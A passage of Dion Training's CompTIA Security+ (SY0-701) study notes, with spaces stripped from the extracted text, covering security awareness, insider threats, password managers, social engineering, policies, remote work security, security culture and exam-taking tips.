+● SecurityAwareness○ SecurityAwareness■ Knowledgeandunderstandingofsecuritythreatsandmitigationmeasures■ Goal● Equipindividualstorecognizeandrespondtothreatsfordataprotection■ Focus● Commonthreats,potentialrisks,bestpracticesforsecuredigital
+
+interactions○ InsiderThreats■ Securityriskfromindividualswithinanorganization■ Source● Employees,formeremployees,contractors,orbusinesspartners■ Risk● Exploitinginsideinformationintentionallyorunintentionally○ PasswordManagement■ Practicesandtoolsforcreating,storing,andmanagingpasswords■ Goal● Ensurestrong,uniquepasswords;securelystored;reducesunauthorized
+
+accessrisk
+
+392https://www.DionTraining.com
+
+## Page 393
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ SocialEngineeringAttacks■ Techniques● Maintainingsituationalawareness,avoidingshouldersurfing,
+
+eavesdropping■ Prevention● Avoidingunauthorizedmedia,cables,recognizingphonescams,
+
+maintainingoperationalsecurity○ PoliciesandHandbooks■ Policies● Formalguidelinesdefiningorganizationoperationsanddecisions■ Handbooks● Comprehensiveguidesprovidinginformation,servingasreferences○ RemoteandHybridWorkEnvironments■ RemoteWork● Performingjobfunctionsoutsidetheofficeusingtechnology■ HybridWork● Combiningin-officeandremoteworkforflexibility○ CreatingaCultureofSecurity■ Organizationalmindsetprioritizingsecurityindailytasksanddecision-making■ Characteristics● Continuouseducation● Proactiveriskmitigation● Collectiveresponsibility
+
+393https://www.DionTraining.com
+
+## Page 394
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● RecognizingInsiderThreats○ RecognizingInsiderThreats■ InsiderThreats● Involverisksposedbyindividualswithinanorganization■ Threatscanbeintentionalorunintentional,arisingfromvariouspersonalfactors■ Trainingemployeestorecognizeanomalousbehaviorisessentialinaddressing
+
+insiderthreats○ BehaviorIndicators■ AlteredStateorSubstanceAbuse● Employeesarrivingatworkintoxicatedorhungovermayindicatepersonal
+
+issues● Impairedjudgmentmayleadtounintentionaldatadisclosureor
+
+misconduct● Potentialforcoercionintomakingpoorsecuritydecisions■ EmotionalDistress● Signsofdepression,givingawaypersonalpossessions,oremotional
+
+turmoil● Emotionaldistressmayleadtonon-compliancewithsecurityprotocols● Vulnerabilitytoexploitationbymaliciousparties■ LifestyleIncongruences● Employeesdemonstratingalifestyleinconsistentwiththeirfinances● Investigatecaseswhereanemployee'sspendingdoesn'talignwith
+
+income● Discreetinvestigationstoruleoutillicitactivities,theft,orinformation
+
+selling
+
+394https://www.DionTraining.com
+
+## Page 395
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ FinancialStruggles● Employeesunderfinancialstressmayexpressfinancialwoestocoworkers● Financialpressurescanmakeindividualssusceptibletobriberyordata
+
+selling● Organizationsshouldhavepoliciesinplaceforhandlingsuchscenarios,
+
+likefinancialcounselingormonitoringforunusualdataaccess○ BuildingaRobustInsiderThreatProgram■ Establishaninsiderthreatprogramtocreateasecurityculture■ Encourageemployeestoreportsuspiciousactivities■ Providetrainingtorecognizewarningsigns■ Implementpoliciesthatsupportmentalhealthandfinancialwell-being■ Ensurefairandconfidentialinvestigationprocesses■ Employuseractivitymonitoringtoolstodetectanomalousbehaviorwhile
+
+respectingemployeeprivacy
+
+● PasswordManagers○ PasswordManager■ Specializedtool,plugin,orextensionusedwithwebbrowsers■ Helpsuserssecurelystoreandmanagevarioususernamesandpasswordsfor
+
+differentwebsites○ PasswordReuseRisks■ Reusingpasswordsacrossmultiplewebsitesisdangerous■ Breachesofonewebsitecanexposereusedpasswords■ Attackersuseknowncredentialstocompromiseothersites■ Mostusernamesareemailaddresses,furtherincreasingrisk
+
+395https://www.DionTraining.com
+
+## Page 396
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Built-Invs.Third-PartyPasswordManagers■ Manywebbrowsersofferbuilt-inpasswordfunctionality■ Third-partypasswordmanagerslikeBitwarden,Dashlane,LastPass,orOnePass
+
+areoftenpreferredforenhancedsecurity○ AdvantagesofPasswordManagers■ Securelystoreandmanagemultiplecredentials■ Preventpasswordreuseandenhancesecurity■ Simplifypasswordmanagementwithasinglemasterpassword■ Encryptandprotectallstoredpasswords■ Automaticallyfillinlogindetailsforeasyaccess■ Organizeandmanagenumerouspasswordsefficiently
+
+● AvoidingSocialEngineering○ SocialEngineering■ Involvesdeceptiontomanipulateindividualsintobreachingsecurityprocedures■ Attacksexploithumanpsychologyandoftenappearinnocent■ Awarenessandvigilanceserveasthefirstlineofdefenseagainstsocial
+
+engineeringattacks○ MaintainingSituationalAwareness■ SituationalAwareness● Mindfulnessaboutsurroundingsandactions■ Essentialtoavoidsocialengineeringattacks■ Examplesofsocialengineeringthreats● Shouldersurfing● Eavesdropping■ Measurestocounterthreats
+
+396https://www.DionTraining.com
+
+## Page 397
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Privacyscreenprotectors● Securediscussions○ PiggybackingandTailgating■ Socialengineersmaytrytoentersecuredpremisesbycloselyfollowing
+
+authorizedpersonnel■ Useaccesscontrolvestibulestorestrictentrytoonepersonatatime■ Maintainsituationalawarenesstopreventunauthorizedaccess○ DumpsterDiving■ Attackerssiftthroughgarbagefordiscardedinformation■ Employeeswithsituationalawarenesscanspotsuchactivities■ Disposeofsensitivedatasecurelytoavoidbeingavictimofthisattack○ OperationalSecurity(OPSEC)■ Protectscriticalinformationfrombeingusedbyadversaries■ Safeguardsensitivedata,dailyroutines,andinternalprocedures■ Discouragesharingseeminglyinnocuousdetailsonsocialmediaorduring
+
+personalinteractions○ TechnologicalSocialEngineeringAttacks■ Baitingattacksuseremovablemediadevices(e.g.,USBthumbdrives)and
+
+chargingcables■ Pickinguporconnectingfounddevicescaninfectworkstationsornetworkswith
+
+malware■ Carryyourownchargingcablesandchargerstoavoiduntrustedones○ PressureTactics■ Socialengineersmayuseasenseofurgencyorfeartomanipulateindividuals■ Urgentrequestsaimtobypassnormalsecurityprotocols■ Peoplearemorelikelytomakemistakeswhenrushedintoaction
+
+397https://www.DionTraining.com
+
+## Page 398
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ProactiveCultureofSecurity■ Trainemployeesregardlessoftheirpositioninthecompany■ Educateonrecognizingphishingattempts,dataprivacy,andsafeonlinebehavior■ Encourageemployeestoreportsuspiciousactivities■ Conductpracticalexercises,likesimulatedphishingattacks,totestandremediate
+
+employees'responses
+
+● PolicyandHandbooks○ PoliciesandHandbooks■ Policy● Asystemofprinciplesandrulesguidingdecisions,ensuringcompliance
+
+withlegalandethicalstandards■ Handbook● Acomprehensiveguideprovidingdetailedinformationonprocedures,
+
+guidelines,andbestpractices■ Policiesandhandbooksarelivingguidelinesthatshapebehaviorand
+
+decision-makinginorganizations■ Thesedocumentsvarybetweenorganizationsbasedonindustry,needs,anduse
+
+cases■ Importanceofnotjustreadingbutunderstandingthepoliciesandhandbooks○ ScopeofPoliciesandHandbooks■ Covervariousaspectsinanorganization,e.g.,dataprotection,remotework,
+
+technologyuse,conflictsofinterest■ Differenthandbooksfordifferentaspects,e.g.,EmployeeHandbook,Training
+
+Handbook,ComplianceHandbook
+
+398https://www.DionTraining.com
+
+## Page 399
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ DataDestructionPolicyExample■ Somepoliciesmaydefinerulesfordatadisposal,e.g.,shredding■ Color-codedpaperfordocumentclassification■ Shreddingofsensitivedocumentstopreventdatabreaches○ RemoteWorkandDataProtection■ Organizationsmayhavestrictguidelinesregardingremotework■ Policiescoverphysicalfilesanddigitalfilesthatleavetheoffice■ Restrictionsonwhatcanbetakenhomeorworkedonremotely○ PolicyGuidanceforDailyResponsibilities■ Provideguidanceonhandlingvarioussituations,e.g.,databreaches,reporting
+
+suspiciousactivity■ Ensuresemployeesknowhowtorespondtospecificscenarios○ PolicyandHandbookUpdates■ Policiesandhandbooksshouldbereviewedatleastannually■ Updatestoreflectchangingcybersecuritylandscape■ Employeeawarenessofpolicyupdatesandsignificantchangesiscrucial○ HumanJudgmentandCultureofSecurity■ Policiesandhandbooksmaynotcovereveryscenario■ Employeesshouldunderstandthe"why"behindthepoliciestomakejudgment
+
+calls■ Creatingacultureofsecurityinvolvesreportinggapsandfosteringasecure
+
+environment○ ImportanceofEmployeeInvolvement■ Encourageemployeestobringupconcernsandquestions■ Opencommunicationwithmanagementandleadershipteams■ Collectiveresponsibilityinpromotingasecureorganizationculture
+
+399https://www.DionTraining.com
+
+## Page 400
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● RemoteandHybridWorkEnvironments○ RemoteWork■ Employeesworkoutsidethetraditionaloffice(e.g.,fromhome,coffeeshops,or
+
+whiletraveling)○ HybridWork■ Combinestraditionalofficeworkwithremoteworkopportunities○ SecurityChallenges■ Increasedriskduetolackofphysicalsecuritycontrolsoutsidetheoffice■ Datatransmittedoverpublicandprivatenetworkscanbeexposedtomalicious
+
+attackers■ Homeandpublicnetworkshaveweakersecuritycontrols■ Potentialforcyberattacks,eavesdropping,anddatabreaches■ Increasedriskofdevicelossortheft○ AddressingSecurityChallenges■ Establishcomprehensivepoliciesforremotework■ EmphasizetheuseofsecureconnectionslikeVPNfordataaccess■ Implementmulti-factorauthenticationforaddedsecurity■ Providecybersecuritytrainingandawarenessforemployees● Encouragereportingofsecurityincidents■ Usecompany-issueddeviceswithup-to-datesecuritysoftware● Definesecuritymeasuresforpersonallyowneddevices(BYOD)■ Setupautomatedbackupsfordataprotection■ Choosesecurecollaborationtoolswithend-to-endencryptionandadministrative
+
+controls■ Maintainclearcommunicationbetweencybersecurityteamandremote
+
+400https://www.DionTraining.com
+
+## Page 401
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+employees■ Conductregularsecurityauditsandfeedbacksessions
+
+● CreatingaCultureofSecurity○ ImportanceofSecurityCulture■ Acultureofsecurityiscrucialforsafeguardinganorganization■ Technicalsecuritysolutionsareineffectiveifemployeesdonotvaluesecurity○ CreatingaCultureofSecurity■ Involvesintegratingcybersecurityintotheorganization'sethos,behaviors,and
+
+decisions■ Requirements● Organizationalchangemanagement● Strategicplanning● Execution● Monitoring● Reporting■ Goal● Embedcybersecurityintoeveryaspectoftheorganizationtoprotect
+
+valuableinformation○ OrganizationalChangeManagement■ Recognizestheroleofthehumanelementinsecurity■ Emphasizesstaffengagementandadherencetosecuritypoliciesandprocedures■ Beginswithcommitmentfromexecutiveleadership■ Communicatescybersecurityasasharedcorporateresponsibility○ DevelopmentPhase■ Involvesdevelopingspecificandactionablesecurityplans
+
+401https://www.DionTraining.com
+
+## Page 402
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Allocatesresourcestosupportplans■ Createcomprehensivepolicies■ Educateemployeesonthreats,■ Establishguidelinesfordatahandling■ Focusesonempowermentandemployeeconfidenceinrecognizingand
+
+respondingtothreats○ ExecutionPhase■ Ongoingprocess,notaone-timeevent■ Includesrollingoutpolicies,conductingtraining,andadaptingtoevolving
+
+securitythreats■ Requiresregulartrainingupdates,simulatedcyberattacks,andconsistentthreat
+
+communication○ ReportingandMonitoring■ Beginwithinitialmonitoringaftertherolloutofasecurityprogram■ Conductrecurringcheck-instomaintainprogramintegrity■ Assessingemployeecompliancewithsecurityprotocols■ Identifyingareasforimprovement■ Creatingacultureofreportingsuspiciousactivities■ Establishingfeedbackloopstoadaptbasedoninsightsfrommonitoringand
+
+reporting○ BenefitsofSecurityCulture■ Resilienceagainstcyberattacks■ Employeevigilancebecomesinherent■ Improvedoperationsandtrust-basedreputation■ Proactivesecuritypostureforfutureuncertainties
+
+402https://www.DionTraining.com
+
+## Page 403
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+Conclusion
+
+● Conclusion○ 5DomainsofCompTIASecurity+(SY0-701)■ Domain1:GeneralSecurityConcepts● Itmakesup12%oftheexam■ Domain2:Threats,Vulnerabilities,andMitigations● Itmakesup22%oftheexam■ Domain3:SecurityArchitecture● Itmakesup18%oftheexam■ Domain4:SecurityOperations● Itmakesup28%oftheexam■ Domain5:SecurityProgramManagementandOversight● Itmakesup20%oftheexam○ Howdoyousignupandscheduleyourexam?■ PearsonVUEorCompTIAWebStore● YoucantakeitatanyPearsonVUEtestingcenterworldwide,ateithera
+
+localtestingcenteroronline● YoucanbuythatexamvoucherbygoingtoPearsonVuedirectlywhen
+
+you'reschedulingyourexamatpearsonvue.com,orgoingtothestoreat
+
+store.comptia.orgtobuyitfromtheCompTIAwebstore● PearsonVUEandCompTIAhavenowcreatedacapabilityforyoutotake
+
+yourcertificationexamonlinefromthecomfortofyourhomeoroffice,
+
+usingthePearsonVUEOnVuetestingsystem
+
+403https://www.DionTraining.com
+
+## Page 404
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ DionTraining● Ifyou'dliketopre-purchaseyourexamvoucherbeforeyouschedulethe
+
+exam,youcanactuallysave10%offthepricebygoingtoourwebsiteat
+
+diontraining.com/vouchers● Currently,wecarryvouchersforover50countriesaroundtheworld,and
+
+weareaddingcountriesallthetime● AsaCompTIAPlatinumPartner,wereceiveaspecialdiscountedrateon
+
+theseexamvouchersandwepassthosesavingsontoourstudentswhen
+
+theyordertheirexamvouchersfromus○ Topfivetipsforincreasingyourscoreontheexam■ Useacheatsheet● You'renotallowedtoactuallycarryanythingintotheexamwithyou,but
+
+ifyou'reatalocaltestingcenter,theywillgiveyouawhiteboardoradry
+
+erasesheetthat'saboutthesizeofanormalpieceofpaper● Oncetheclockstartsontheexam,youcanbrain-dumpanythingyou
+
+wantontothatpaper● Usethesheetandspendthefirst1-2minuteswritingdownthose
+
+importantthingsyoumayforgetlateron■ Skipanyquestionsthataregivingyoutrouble● Ifyoufindyourselfstrugglingwithareallyhardquestion,justmarkitfor
+
+reviewandskipit● Studentswhodothisendupincreasingtheirscorebyatleast5%to10%
+
+- vertheirpeerswhotrytodothesimulationsatthebeginningoftheir
+exam■ Takeaguess● Ifyou'reindoubt,takeaguessfromthepossibleanswerchoices
+
+404https://www.DionTraining.com
+
+## Page 405
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Thereisnopenaltyforguessingincorrectlyontheexam● Ifyouareindoubtoftherightanswer,trytoeliminateasmanychoicesas
+
+possibleandguessbetweentheremainingansweroptions■ Pickthebesttimeforyourexam● Pickthetimeofdaythatworksbestforyou● Don’ttrytosqueezetheexaminafterworkingalongdayattheoffice■ Beconfident● You’vegotthis!● Youshouldalreadyknowyou'regoingtopass!● Youshouldhavealreadystudiedalltheinformationinthiscourse,you've
+
+watchedthevideos,you'vetakenthequizzes,you'vestudiedyour
+
+downloadablestudynotes● Ifyou'renotconfidentrightnow,thenwaitafewdaystoscheduleyour
+
+exam● Takeabunchofpracticeexamsandbuildupyourconfidence○ Whenyoutakeapracticeexam,yourgoalisnottomemorizetheanswerkey■ Youneedtounderstandwhytherightanswerwasrightandthewronganswers
+
+arewrong○ Goodluck,andwehopetoseeyouagaininafuturecourseasyoucontinueupwardsin
+
+yourcybersecuritycareerandcontinuetoclimbtheCompTIAcertificationladderinto
+
+CySA+,PenTest+andCASP+!
+
+405https://www.DionTraining.com
